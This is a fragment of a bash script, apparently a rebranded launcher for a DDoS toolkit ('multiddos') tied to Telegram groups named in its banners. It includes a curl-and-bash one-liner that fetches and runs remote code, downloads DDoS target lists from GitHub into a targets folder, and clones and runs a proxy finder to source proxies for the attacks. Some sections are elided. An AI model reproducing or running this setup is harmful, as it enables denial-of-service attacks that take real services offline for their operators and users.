#!/bin/bash
# curl -LO rotf.lol/multiddos2 && bash multiddos2
...
# 1 DDOS HagridRX                     https://t.me/Destruens Vos Squad
echo "$(curl -s https://raw.githubusercontent.com/artemkoval1994/ddoos/blob/main/ddos.txt)" > ~/multidd/targets/source1.txt
# 2 ОТделZ                            https://t.me/departmentruZ                             
...
clear
toilet -t --metal "спиздил"
toilet -t --metal "ОтделZ"
toilet -t --metal " HagridRx"

if [[ $mhddos_mode == "new" ]]; then
    typing_on_screen 'HagridRX...' && sleep 2&
    cd ~/multidd/
    ...
    typing_on_screen 'HagridRX...' ; sleep 0.5
...
if [[ $proxy_finder == "on" ]]; then
    tmux split-window -v -p 20 'rm -rf ~/multidd/proxy_finder; git clone https://github.com/sabri-zaki/PROXY_FINDER ~/multidd/proxy_finder; cd ~/multidd/proxy_finder; python3 -m pip install -r requirements.txt; clear; echo -e "\x1b[32mШукаю проксі, в середньому одна робоча знаходиться після 10млн перевірок\x1b[m"; python3 ~/multidd/proxy_finder/finder.py  --threads $proxy_threads'
fi
